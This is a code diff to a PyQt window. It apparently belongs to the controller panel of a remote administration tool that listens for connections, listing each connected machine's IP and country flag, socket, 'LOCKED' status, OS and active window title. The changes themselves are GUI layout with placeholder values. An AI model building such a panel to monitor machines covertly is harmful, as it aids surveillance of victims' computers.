@@ -26,14 +26,16 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
 
         # initial geo ip database
         self.geoip = pygeoip.GeoIP('assets\\GeoIP.dat')
-        # initial flags directory
+        # initial assets directories
+        self.assets = 'assets\\'
         self.flags = 'assets\\flags\\'
 
         # indexes for servers table
         self.index_of_ipAddress = 0
-        self.index_of_location = 1
-        self.index_of_socket = 2
+        self.index_of_socket = 1
+        self.index_of_lock = 2
         self.index_of_os = 3
+        self.index_of_activeWindowTitle = 4
 
         # Triggers
         self.startListenButton.clicked.connect(self.startListen)
@@ -96,16 +98,37 @@ class MainDialog(QMainWindow, main_ui.Ui_MainWindow):
     def updateServersTable(self):
         self.serversTable.setRowCount(len(self.socks))
         for index, obj in enumerate(self.socks):
+
+            # add ip address & county flag
             ip_address = self.socks[obj]['ip_address']
             item = QTableWidgetItem(ip_address)
             item.setIcon(QIcon(self.getIpLocation(ip_address)))
             self.serversTable.setItem(index, self.index_of_ipAddress, item)
-            item = QTableWidgetItem('Georgia')
-            self.serversTable.setItem(index, self.index_of_location, item)
+
+            # add socket number
             item = QTableWidgetItem(str(self.socks[obj]['socket']))
+            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
             self.serversTable.setItem(index, self.index_of_socket, item)
+
+            # add server lock status
+            item = QTableWidgetItem('LOCKED')
+            item.setTextColor(QColor('red'))
+            item.setTextAlignment(Qt.AlignCenter | Qt.AlignVCenter)
+            self.serversTable.setItem(index, self.index_of_lock, item)
+
+            # add os version
             item = QTableWidgetItem('Windows 7 Service pack 3')
             self.serversTable.setItem(index, self.index_of_os, item)
+
+            # add active windows title
+            item = QTableWidgetItem('Test Active Window Title')
+            item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
+            self.serversTable.setItem(index, self.index_of_activeWindowTitle, item)
+
+        # adjust table
+        self.serversTable.resizeColumnsToContents()
+        header = self.serversTable.horizontalHeader()
+        header.setStretchLastSection(True)
         # update servers online counter
         self.onlineStatus.setText(str(len(self.socks)))
 
